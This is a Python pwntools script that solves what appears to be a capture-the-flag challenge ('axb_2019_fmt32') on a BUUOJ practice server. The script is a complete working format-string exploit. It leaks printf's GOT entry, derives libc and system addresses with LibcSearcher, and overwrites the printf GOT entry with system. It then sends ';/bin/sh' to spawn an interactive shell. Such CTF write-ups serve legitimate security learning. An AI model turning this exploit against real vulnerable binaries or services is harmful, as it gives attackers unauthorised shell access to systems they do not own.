from pwn import *

context(log_level='debug')

#io=process("./axb_2019_fmt32")
io=remote("node3.buuoj.cn",28038)
elf=ELF("./axb_2019_fmt32")



io.recv()
printf_got=elf.got['printf']

#payload=b'a'+p32(printf_got)+b'%8$s'

payload=b'%9$sa'+p32(printf_got)
io.send(payload)
io.recvuntil(':')
printf_addr=u32(io.recv(4))
success('printf addr: '+hex(printf_addr))

io.recv()
payload=b'a'+p32(printf_got)+b'%8$s'

io.send(payload)

io.recvuntil(b'\x08')

printf=u32(io.recv(4))

print("printf is ",hex(printf))
io.recv()

from LibcSearcher import *  

libc = LibcSearcher('printf',printf)  
#获取libc加载地址  
libc_base = printf - libc.dump('printf')  
#获取system地址  
system_addr = libc_base + libc.dump('system')  
#获取/bin/sh地址  
#binsh_addr = libc_base + libc.dump('str_bin_sh')  


payload=b'aaaaa'+fmtstr_payload(9,{printf_got:system_addr},write_size = "byte",numbwritten = 0xe)

io.send(payload)

sleep(0.1)
io.recv()
io.sendline(b';/bin/sh\x00')

io.interactive()